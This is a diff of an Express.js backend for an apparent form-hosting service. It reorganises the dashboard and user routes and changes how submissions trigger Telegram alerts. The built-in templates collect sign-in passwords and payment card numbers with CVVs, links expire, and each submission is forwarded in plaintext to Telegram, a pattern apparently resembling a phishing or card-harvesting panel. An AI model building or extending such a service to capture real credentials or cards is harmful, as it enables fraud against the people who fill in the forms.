@@ -419,95 +419,21 @@ function verifyPaystackWebhook(req, res, next) {
 }
 
 // Routes
-app.get('/dashboard', authenticateToken, async (req, res) => {
+app.get('/user', authenticateToken, async (req, res) => {
   try {
-    const userId = req.user.userId;
-    console.log(`Processing /dashboard request for user ${userId}`);
-
-    // Fetch user info (from original /user)
-    const user = await User.findOne({ id: userId });
+    const user = await User.findOne({ id: req.user.userId });
     if (!user) {
       return res.status(404).json({ error: 'User not found' });
     }
+
     const { id, username, email, createdAt } = user;
-
-    // Fetch forms data (from original /get)
-    const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });
-    console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);
-
-    const adminSettings = await AdminSettings.findOne();
-    console.log(`Loaded admin settings:`, adminSettings);
-
-    const activeSubscription = await hasActiveSubscription(userId);
-    const isSubscribed = !!activeSubscription;
-    let subscriptionDetails = null;
-    if (isSubscribed) {
-      subscriptionDetails = {
-        billingPeriod: activeSubscription.billingPeriod,
-        endDate: activeSubscription.endDate,
-      };
-    }
-
-    const userFormConfigs = {};
-    const validForms = [];
-    const formConfigs = await FormConfig.find({ userId });
-    for (const config of formConfigs) {
-      const isExpired = await isFormExpired(config.formId);
-      if (!isExpired) {
-        const computedExpiresAt = (adminSettings.restrictionsEnabled && !isSubscribed)
-          ? new Date(new Date(config.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
-          : null;
-        userFormConfigs[config.formId] = { ...config.toObject(), expiresAt: computedExpiresAt };
-        validForms.push(config.formId);
-      }
-    }
-    console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')})`);
-
-    const templates = {
-      'sign-in': {
-        name: 'Sign In Form',
-        fields: [
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
-          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
-        ],
-      },
-      'contact': {
-        name: 'Contact Form',
-        fields: [
-          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
-        ],
-      },
-      'payment-checkout': {
-        name: 'Payment Checkout Form',
-        fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
-          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
-          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
-        ],
-      },
-    };
-
-    const responseData = {
+    res.json({
       user: { id, username, email, createdAt },
-      submissions,
-      formConfigs: userFormConfigs,
-      templates,
-      isSubscribed,
-      subscriptionDetails,
-    };
-    console.log(`Returning dashboard data for user ${userId}:`, {
-      submissionCount: responseData.submissions.length,
-      formConfigCount: Object.keys(responseData.formConfigs).length,
-      templateKeys: Object.keys(responseData.templates),
-      isSubscribed: responseData.isSubscribed,
-      subscriptionDetails: responseData.subscriptionDetails,
+      message: 'User info retrieved successfully',
     });
-
-    res.json(responseData);
   } catch (error) {
-    console.error('Error fetching dashboard data:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch dashboard data', details: error.message });
+    console.error('Error fetching user info:', error);
+    res.status(500).json({ error: 'Failed to fetch user info' });
   }
 });
 
@@ -749,6 +675,91 @@ app.get('/api/telegram/connect', authenticateToken, async (req, res) => {
   }
 });
 
+app.get('/get', authenticateToken, async (req, res) => {
+  try {
+    const userId = req.user.userId;
+    console.log(`Processing /get request for user ${userId}`);
+
+    const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });
+    console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);
+
+    const adminSettings = await AdminSettings.findOne();
+    console.log(`Loaded admin settings:`, adminSettings);
+
+    const activeSubscription = await hasActiveSubscription(userId);
+    const isSubscribed = !!activeSubscription;
+    let subscriptionDetails = null;
+    if (isSubscribed) {
+      subscriptionDetails = {
+        billingPeriod: activeSubscription.billingPeriod,
+        endDate: activeSubscription.endDate,
+      };
+    }
+
+    const userFormConfigs = {};
+    const validForms = [];
+    const formConfigs = await FormConfig.find({ userId });
+    for (const config of formConfigs) {
+      const isExpired = await isFormExpired(config.formId);
+      if (!isExpired) {
+        const computedExpiresAt = (adminSettings.restrictionsEnabled && !isSubscribed)
+          ? new Date(new Date(config.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
+          : null;
+        userFormConfigs[config.formId] = { ...config.toObject(), expiresAt: computedExpiresAt };
+        validForms.push(config.formId);
+      }
+    }
+    console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')})`);
+
+    const templates = {
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
+        ],
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+        ],
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
+        ],
+      },
+    };
+
+    const responseData = {
+      submissions,
+      formConfigs: userFormConfigs,
+      templates,
+      userId,
+      isSubscribed,
+      subscriptionDetails,
+    };
+    console.log(`Returning data for user ${userId}:`, {
+      submissionCount: responseData.submissions.length,
+      formConfigCount: Object.keys(responseData.formConfigs).length,
+      templateKeys: Object.keys(responseData.templates),
+      userId: responseData.userId,
+      isSubscribed: responseData.isSubscribed,
+      subscriptionDetails: responseData.subscriptionDetails,
+    });
+
+    res.json(responseData);
+  } catch (error) {
+    console.error('Error fetching data for /get:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
+  }
+});
+
 app.post('/create', authenticateToken, async (req, res) => {
   try {
     console.log('Received /create request:', req.body);
@@ -956,32 +967,29 @@ app.post('/form/:id/submit', limiter, async (req, res) => {
     await submission.save();
     console.log(`Submission saved successfully for form ${formId} by user ${userId}`);
 
-    // Fire Telegram notification asynchronously without awaiting
-    (async () => {
-      try {
-        const subscription = await Subscription.findOne({
-          userId,
-          status: 'active',
-          endDate: { $gt: new Date() },
-        });
-        if (subscription) {
-          const telegram = await Telegram.findOne({ userId });
-          if (telegram && telegram.chatId) {
-            const notificationMessage = `New submission received for form ${formId}:\n${Object.entries(mappedData)
-              .map(([key, value]) => `${key}: ${value}`)
-              .join('\n')}`;
-            await bot.telegram.sendMessage(telegram.chatId, notificationMessage);
-            console.log(`Sent Telegram notification to chatId ${telegram.chatId} for user ${userId}`);
-          } else {
-            console.log(`No Telegram chatId found for user ${userId}, skipping notification`);
-          }
+    try {
+      const subscription = await Subscription.findOne({
+        userId,
+        status: 'active',
+        endDate: { $gt: new Date() },
+      });
+      if (subscription) {
+        const telegram = await Telegram.findOne({ userId });
+        if (telegram && telegram.chatId) {
+          const notificationMessage = `New submission received for form ${formId}:\n${Object.entries(mappedData)
+            .map(([key, value]) => `${key}: ${value}`)
+            .join('\n')}`;
+          await bot.telegram.sendMessage(telegram.chatId, notificationMessage);
+          console.log(`Sent Telegram notification to chatId ${telegram.chatId} for user ${userId}`);
         } else {
-          console.log(`User ${userId} is not subscribed, skipping Telegram notification`);
+          console.log(`No Telegram chatId found for user ${userId}, skipping notification`);
         }
-      } catch (telegramError) {
-        console.error('Background Telegram notification failed:', telegramError.message);
+      } else {
+        console.log(`User ${userId} is not subscribed, skipping Telegram notification`);
       }
-    })();
+    } catch (telegramError) {
+      console.error('Error sending Telegram notification:', telegramError.message);
+    }
 
     res.status(200).json({ message: 'Submission saved successfully' });
   } catch (error) {
@@ -1370,3 +1378,4 @@ app.listen(port, () => {
   console.error('Server startup error:', error.message, error.stack);
   process.exit(1);
 });
+
